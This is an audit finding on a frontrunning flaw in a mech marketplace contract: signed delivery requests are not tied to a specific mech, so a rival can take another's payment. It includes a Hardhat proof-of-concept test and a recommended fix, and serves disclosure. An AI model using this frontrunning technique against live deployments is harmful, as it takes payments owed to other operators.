# [M] deliverMarketplaceWithSignatures can be frontrun

## Summary
Severity: Medium
Contest weight: 0.3699
Dataset id: 6370
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
When a requester signs requests to be delivered by a priority mech through deliverMarketplaceWithSignatures, the request/signature and its verification process does not bind the request to a specific mech. Assume a mech M1 has in possession a request of a requester and its corresponding signature, then it performs a very resource intensive task to deliver the delivery data for the requester. When M1 calls the deliverMarketplaceWithSignatures endpoint of the marketplace while its transaction is in the mempool (public mempools), any other mech M2 can frontrun this transaction to deliver the computed data and in returns:
• Increase its karma for M2.
• Steal the payment from M1.

## Proof of Concept
add the following test case to test/MechFixedPriceNative.js and run:
```bash
npm exec hardhat test -- --grep "Frontrun requests with signatures"
context("Deliver", async function () {
it("Frontrun requests with signatures", async function () {
const numRequests = 10;
const datas = new Array();
const requestIds = new Array();
const signatures = new Array();
const deliveryRates = new Array(numRequests).fill(maxDeliveryRate);
let requestCount = 0;
// Pre-pay the contract insufficient amount for posting a request
await deployer.sendTransaction({to: balanceTrackerFixedPriceNative.address, value: maxDeliveryRate *
numRequests});
// Get deployer wallet
const accounts = config.networks.hardhat.accounts;
const wallet = ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${0}`);
const signingKey = new ethers.utils.SigningKey(wallet.privateKey);
// Stack all requests
for (let i = 0; i < numRequests; i++) {
datas[i] = data + "00".repeat(i);
requestIds[i] = await mechMarketplace.getRequestId(deployer.address, datas[i], maxDeliveryRate,
requestCount);
const signature = signingKey.signDigest(requestIds[i]);
// Extract v, r, s
const r = ethers.utils.arrayify(signature.r);
const s = ethers.utils.arrayify(signature.s);
const v = ethers.utils.arrayify(signature.v);
// Assemble 65 bytes of signature
signatures[i] = ethers.utils.hexlify(ethers.utils.concat([r, s, v]));
requestCount++;
}
// an expensive task performed by the priority mech
async function expensiveComputation(requestDatas) {
return requestDatas;
}
const deliveryDatas = await expensiveComputation(datas);
// different mech delivers the request
await deliveryMech.deliverMarketplaceWithSignatures(deployer.address, datas, signatures, deliveryDatas,
deliveryRates, "0x");
// Deliver requests by priority mech fails
await expect(
priorityMech.deliverMarketplaceWithSignatures(deployer.address, datas, signatures, deliveryDatas,
deliveryRates, "0x")
).to.be.revertedWithCustomError(mechMarketplace, "SignatureNotValidated");
});
```

## Recommendation
Make sure the derived requestId hash take into consideration the priority mech address among other values.
